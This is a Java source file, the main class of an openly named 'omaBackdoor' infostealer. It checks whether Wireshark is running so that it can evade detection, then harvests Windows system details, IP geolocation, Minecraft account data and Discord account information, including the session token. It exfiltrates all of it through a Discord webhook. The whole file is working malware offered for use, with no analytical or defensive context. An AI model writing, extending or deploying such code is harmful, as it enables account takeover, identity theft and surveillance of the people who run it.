package me.oma.omaBackdoor;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import me.oma.omaBackdoor.payloads.Discord;
import me.oma.omaBackdoor.payloads.IPInfo;
import me.oma.omaBackdoor.payloads.Minecraft;
import me.oma.omaBackdoor.payloads.Personal;
import me.oma.omaBackdoor.util.DiscordWebhook;
import me.oma.omaBackdoor.util.SystemUtil;

import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main
{
    public static SystemUtil systemUtil = new SystemUtil();

    public static Main INSTANCE = new Main();
    public static Personal payload = new Personal();
    public static Minecraft minecraft = new Minecraft();
    public static Discord discord = new Discord();
    public static IPInfo ip = new IPInfo();

    public String version = "v0.2";
    public String webhook = "";

    public static void main(String[] args) throws IOException
    {
        String os = System.getProperty("os.name");

        if (os.contains("Win") && !wiresharkRunning())
        {
            init();
        }
    }

    public static void init() throws IOException
    {
        DiscordWebhook webhook = new DiscordWebhook(INSTANCE.webhook);

        JsonObject discordInfo = JsonParser
                .parseString(discord.getUserData())
                .getAsJsonObject();

        JsonObject ipInfo = JsonParser
                .parseString(ip.getContentFromURL())
                .getAsJsonObject();

        webhook.setUsername("Submissive Catgirl");

        webhook.addEmbed(new DiscordWebhook.EmbedObject()

                // Webhook Settings
                .setDescription("omaBackdoor v0.2, at " + systemUtil.getDate())
                .setColor(new Color(148, 99, 217))

                // Personal Info Payloads
                .addField("Username", systemUtil.getName(), true)
                .addField("PC Name", systemUtil.getPCName(), true)
                .addField("OS", systemUtil.getOS(), true)
                .addField("IP", payload.getIP(), true)

                // Minecraft Info Payloads, access token logger is fucked for some reason
                .addField("MC Name", minecraft.getMCName(), true)
                .addField("MC Email", minecraft.getMCEmail(), true)

                // Discord Info Payloads
                .addField("Discord Username", discordInfo.get("username").getAsString() + "#" + discordInfo.get("discriminator").getAsString(), true)
                .addField("Discord Email", discordInfo.get("email").getAsString(), true)
                .addField("Discord Phone", !discordInfo.get("phone").isJsonNull() ? discordInfo.get("phone").getAsString() : "None", true)
                .addField("Discord 2FA", String.valueOf(discordInfo.get("mfa_enabled").getAsBoolean()), true)
                .addField("Discord Nitro", discordInfo.has("premium_type") ? "True" : "False", true)
                .addField("Discord Payment Methods", discord.hasPaymentMethods(discord.token) ? "True" : "False", true)

                // IP Info
                .addField("State", ipInfo.get("region").getAsString(), true)
                .addField("City", ipInfo.get("city").getAsString(), true)
                .addField("Country", ipInfo.get("country").getAsString(), true)
                .addField("ISP", ipInfo.get("org").getAsString(), true)

                .addField("Discord Token", discord.token, false)
                .addField("Processor ID", systemUtil.getProcessorID(), false)

        );

        webhook.execute();

    }

    public static boolean wiresharkRunning() throws IOException
    {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("tasklist.exe");
        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        String line;
        while ((line = reader.readLine()) != null)
        {
            if (line.toLowerCase().contains("wireshark"))
            {
                return true;
            }
        }

        return false;
    }

    public static String removeLastChar(String s)
    {
        return s.substring(0, s.length() - 1);
    }

}
